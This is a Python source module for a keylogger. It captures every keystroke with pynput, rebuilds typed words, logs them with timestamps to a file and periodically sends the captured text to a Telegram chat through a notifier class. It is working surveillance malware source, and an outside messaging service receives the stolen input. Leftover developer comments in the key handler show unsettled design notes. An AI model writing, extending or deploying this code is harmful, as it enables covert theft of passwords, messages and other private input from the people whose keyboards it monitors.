# keylogger/core.py
import datetime
import threading
from pynput import keyboard
from .handlers import KeyHandler
from .notifiers import TelegramNotifier
from . import utils

class SimpleKeylogger:
    def __init__(self, filename="keylog.txt", telegram_token=None, telegram_chat_id=None):
        self.filename = filename
        self.start_time = datetime.datetime.now()
        self.buffer = ""
        self.running = True
        self.timer = None
        self.timer_interval = 30

        self.notifier = TelegramNotifier(telegram_token, telegram_chat_id)
        self.key_handler = KeyHandler()

    def flush_buffer(self):
        if self.buffer:
            with open(self.filename, "a", encoding="utf-8") as f:
                f.write(self.buffer)
            self.notifier.send(self.buffer)
            self.buffer = ""

    def periodic_flush(self):
        if self.running:
            self.flush_buffer()
            self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
            self.timer.daemon = True
            self.timer.start()

    def on_press(self, key):
        current_time = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry, word, should_stop = self.key_handler.process_key(key)

        # Handle word completion (if word is returned from special keys)
        # We need to capture the word when space/enter/tab is pressed
        # In process_key we returned word from those keys, but we also have log_entry
        # Let's restructure: process_key returns (log_entry, completed_word, should_stop)
        # completed_word is the word that was completed (if any), otherwise None

        # Actually better: process_key returns (log_entry, completed_word, should_stop)
        # We'll adjust handler to return completed_word when space/enter/tab.

        # For now, let's assume handler returns completed_word only for those keys.

        if log_entry:
            # Log the key
            full_log = f"[{current_time}] {log_entry}\n"
            self.buffer += full_log
            print("\033[1;32m[{}]\033[0m {}".format(current_time, log_entry))

        # If a word was completed (from space/enter/tab), also log the word
        if word is not None and word != "":
            word_entry = f"[{current_time}] [WORD] {word}\n"
            self.buffer += word_entry
            print("\033[1;36m[WORD]\033[0m {}".format(word))

        # Flush if buffer too large
        if len(self.buffer) >= 200:
            self.flush_buffer()

        if should_stop:
            print("\n\033[1;31m[!]\033[0m ESC detected, stopping keylogger...")
            return False
        return True

    def start(self):
        utils.clear_screen()
        utils.print_banner(self.start_time, self.filename, self.notifier.enabled)

        print("\033[1;33m[*]\033[0m Press \033[1;31mESC\033[0m to stop the keylogger")
        print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
        print("\033[1;37m" + "-" * 70 + "\033[0m\n")

        if self.notifier.enabled:
            self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
            self.timer.daemon = True
            self.timer.start()

        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        finally:
            self.running = False
            if self.timer:
                self.timer.cancel()
            self.flush_buffer()
            utils.print_footer(self.start_time, self.key_handler.key_count, self.filename)

        